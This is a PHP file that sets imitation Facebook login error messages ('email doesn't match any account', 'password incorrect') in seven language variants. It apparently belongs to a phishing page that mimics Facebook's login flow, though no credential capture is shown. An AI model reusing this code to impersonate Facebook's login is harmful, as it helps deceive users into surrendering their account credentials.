<?php
if(isset($_GET['len'])){
$len = $_GET['len'];
if($len  == "1"){
$wrongmail = ' <font color = "white" size = "2"> သင်ထည့်သွင်းထားသော အီးမေးလ် (သို့) ဖုန်းနံပါတ်သည် မည်သည့်အကောင့်နှင့်မျှ ကိုက်ညီမှုမရှိပါ။  </font> <a href = " http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr "> <font color = "white" style = "font-weight:500" ><b> အကောင့်တစ်ခုဖွင့်ပါ </a></b> </font> ';

$wrongpassword = '<font color = "white" size = "2"> သင်ထည့်သွင်းသောစကားဝှက် မှားနေပါသည်။ <a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b> သင့်စကားဝှက်ကို မေ့နေပါသလား။</b></a> </font>';
}elseif($len  == "2"){
$wrongmail = " <font color = 'white' size = '2'> The email address or phone number that you've entered doesn't match any account.</font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b>Sign up for an account.</a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> The password you entered is incorrect. <a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b>Did you forget your password?</b></a> </font>';
} elseif($len  == "3"){
$wrongmail = " <font color = 'white' size = '3'> 找不到与输入的邮箱或手机号对应的帐户</font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b>请注册帐户。</a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> 你输入的密码不正确。<a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b> 忘记密码? </b></a> </font>';
}elseif($len  == "4"){
$wrongmail = " <font color = 'white' size = '2'> O e-mail ou o número de telefone inserido não corresponde a nenhuma conta. </font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b> Cadastre-se para abrir uma conta. </a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> A senha que você inseriu está incorreta.<a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b> Você esqueceu sua senha?</b></a> </font>';
} elseif($len  == "5"){
$wrongmail = " <font color = 'white' size = '2'> သင္ထည့္သြင္းထားေသာ အီးေမးလ္ (သို့) ဖုန္းနံပါတ္သည္ မည္သည့္အေကာင့္ႏွင့္မၽွ ကိုက္ညီမွုမရွိပါ။ </font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b> အေကာင့္တစ္ခုဖြင့္ပါ။ </a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> သင္ထည့္သြင္းေသာစကားဝွက္ မွားေနပါသည္။<a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b>သင့္စကားဝွက္ကို ေမ့ေနပါသလား။</b></a> </font>';
} elseif($len  == "6"){ 
$wrongmail = " <font color = 'white' size = '2'> อีเมลหรือหมายเลขโทรศัพท์ที่คุณป้อนไม่ตรงกับบัญชีผู้ใช้ใดๆ </font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b> สมัครใช้งานบัญชีผู้ใ </a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> รหัสผ่านที่คุณป้อนไม่ถูกต้อง<a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b> คุณลืมรหัสผ่านของคุณใช่ไห</b></a> </font>';
} elseif($len  == "7"){ 
$wrongmail = " <font color = 'white' size = '2'> El correo electrónico o el número de teléfono que ingresaste no coinciden con ninguna cuenta. </font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500' ><b> Regístrate para crear una cuenta. </a></b> </font> ";

$wrongpassword = '<font color = "white" size = "2"> La contraseña que ingresaste es incorrecta.<a href = " https://m.facebook.com/recover/initiate/? "> </font> <font color = "white" style = "font-weight:500" > <b> ¿Olvidaste tu contraseña?</b></a> </font>';
} else{
header("Location:?len=2");
}
} else{
$wrongmail = " <font color = 'white' size = '2'> The email address or phone number that you've entered doesn't match any account.</font> <a href = 'http://h.facebook.com/hr/r?redirect_app=5&next=https%3A%2F%2Fm.facebook.com%2Fr.php&zc=Aform8DMnu1GwG0zmKch3P08GIzXPetaqG3PBO5vcusy_KYjt4c4gx4QIPQr_LB6AMQ&rtime=1475740034&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F&_rdr'> <font color=white style = 'font-weight:500'><b>Sign up for an account.</a></b> </font> ";
$wrongpassword = '<font color = "white" size = "2"> The password you entered is incorrect. <a href = " https://m.facebook.com/recover/initiate/? "> </font><font color = "white" style = "font-weight:500" ><b>Did you forget your password?</b></a> </font>';

}
?> 